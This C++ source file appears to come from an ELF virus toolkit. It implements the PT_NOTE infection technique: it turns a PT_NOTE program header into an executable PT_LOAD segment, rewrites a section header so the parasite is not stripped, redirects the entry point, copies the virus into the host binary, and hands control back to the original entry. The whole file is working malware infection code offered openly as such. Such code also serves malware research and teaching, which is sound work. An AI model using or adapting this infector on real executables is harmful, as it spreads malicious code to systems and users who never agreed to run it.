#include "infector/pt_note_infect.hh"
#include <elf.h>
#include <algorithm>
#include "common/file_descriptor.hh"
#include "common/patch_pattern.hh"
#include "common/patch_relinguish_control.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/string.hh"

namespace vt::infector {

namespace {

uint64_t round_up_to(uint64_t v, uint64_t alignment) {
  return (v & ~(alignment - 1)) + alignment;
}

bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
               uint64_t virus_offset, Elf64_Off original_pt_note_file_offset,
               Elf64_Addr parasite_load_address) {
  auto sht_entry_count = ehdr.e_shnum;
  auto* section_entry = &shdr;

  for (size_t i = 0; i < sht_entry_count; ++i) {
    if (section_entry->sh_offset == original_pt_note_file_offset) {
      section_entry->sh_offset = virus_offset;
      section_entry->sh_size = virus_size;
      section_entry->sh_addr = parasite_load_address;
      section_entry->sh_type = SHT_PROGBITS;
      section_entry->sh_flags = SHF_EXECINSTR | SHF_ALLOC;
      section_entry->sh_addralign = 64;
      return true;
    }
    // Move to the next section entry
    ++section_entry;
  }
  // Failed to find the section header entry.
  return false;
}

void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
                size_t pt_note_to_be_infected_idx,
                Elf64_Xword pt_load_alignment,
                Elf64_Addr parasite_load_address) {
  auto* pt_note_to_be_infected = &phdr + pt_note_to_be_infected_idx;
  // trasforming pt_note to pt_load
  pt_note_to_be_infected->p_align = pt_load_alignment;
  pt_note_to_be_infected->p_vaddr = parasite_load_address;
  pt_note_to_be_infected->p_paddr = parasite_load_address;
  pt_note_to_be_infected->p_filesz = virus_size;
  pt_note_to_be_infected->p_memsz = virus_size;
  pt_note_to_be_infected->p_offset = virus_offset;
  pt_note_to_be_infected->p_type = PT_LOAD;
  pt_note_to_be_infected->p_flags = PF_R + PF_X;
}

void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr parasite_load_address,
                uint64_t virus_offset) {
  ehdr.e_entry = parasite_load_address;
}

}  // namespace

bool PtNoteInfect::analyze(const common::Mmap<PROT_READ>& host_mapping,
                           const common::Mmap<PROT_READ>& parasite_mapping) {
  host_size_ = host_mapping.size();
  parasite_size_ = parasite_mapping.size();
  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
    return false;
  }

  const auto& phdr =
      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);

  original_e_entry_ = ehdr.e_entry;

  // Find code segment
  const Elf64_Phdr* phdr_entry = &phdr;
  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
    if (phdr_entry->p_type == PT_LOAD) {
      // the parasite should have a loading address avoiding all other LOAD
      // segments.
      auto last_byte_of_segment = phdr_entry->p_vaddr + phdr_entry->p_memsz - 1;
      auto potential_virus_loading_addr = last_byte_of_segment + 1;
      parasite_load_address_ = std::max(
          parasite_load_address_,
          round_up_to(potential_virus_loading_addr, phdr_entry->p_align));
      // copy alignment so later we can assign to PT_NOTE.
      pt_load_alignment_ = phdr_entry->p_align;
    } else if (phdr_entry->p_type == PT_NOTE) {
      // We found the last PT_NOTE section that can be infected, because
      // GNU_PROPERTY (for example on x86-64) might overlap with the first. On
      // aarch64, it doesn't have such problem.
      pt_note_to_be_infected_idx_ = i;
      original_pt_note_file_offset_ = phdr_entry->p_offset;
    }
    // Do not early break out because we must scan all LOAD segments to find the
    // highest vaddress.
  }

  return true;
}

bool PtNoteInfect::infect(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                          vt::common::Mmap<PROT_READ> parasite_mapping) {
  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());

  const auto virus_size = parasite_mapping.size();

  // In order to make it work on PIEs, these two must be the same.
  const auto virus_offset = parasite_load_address_;
  {
    auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
        host_mapping.mutable_base() + ehdr.e_phoff);
    patch_phdr(mutable_phdr, virus_size, virus_offset,
               pt_note_to_be_infected_idx_, pt_load_alignment_,
               parasite_load_address_);
  }

  {
    // mutate a note section entry to cover our virus so it doesn't get
    // stripped.
    auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
        host_mapping.mutable_base() + ehdr.e_shoff);
    if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset,
                   original_pt_note_file_offset_, parasite_load_address_)) {
      return false;
    }
  }

  {
    auto& mutable_ehdr =
        *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
    patch_ehdr(mutable_ehdr, parasite_load_address_, virus_offset);
  }

  // Inject the virus.
  vt::memcpy(host_mapping.mutable_base() + virus_offset,
             parasite_mapping.base(), parasite_mapping.size());

  return patch_parasite_and_relinquish_control(
      ehdr.e_type, original_e_entry_, parasite_load_address_, virus_offset,
      parasite_mapping.size(), host_mapping);
}

size_t PtNoteInfect::injected_host_size() {
  // In order to make this work on PIEs, the virus file offset must equal to
  // vaddr. Therefore, the file size will be extended. Note that this is not
  // necessary for non-PIE but doing this makes both PIE and non-PIE handling
  // simple. The size effect is that the executable would be very big, if the
  // victim happens to use a custom linker script that points segments at a very
  // large starting vaddr.
  return parasite_load_address_ + parasite_size_;
}

}  // namespace vt::infector